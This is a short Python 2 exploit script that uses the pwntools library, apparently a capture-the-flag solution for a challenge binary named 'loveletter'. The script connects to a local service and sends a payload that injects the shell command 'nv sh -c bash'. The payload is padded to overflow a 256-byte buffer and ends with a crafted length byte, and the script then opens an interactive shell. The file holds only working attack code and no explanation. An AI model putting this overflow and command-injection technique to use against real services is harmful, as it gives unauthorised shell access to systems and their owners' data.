#!/usr/bin/env python2
from pwn import *

ready = True
if ready:
    conn = remote('localhost', 9034)
else:
    conn = process(['/home/doublesine/Desktop/loveletter'])

payload = 'nv sh -c bash ' + 'A' * (256 - 14 - 2 - 1) + '|\x01'

sleep(0.5)
conn.sendline(payload)
sleep(0.5)
conn.interactive()
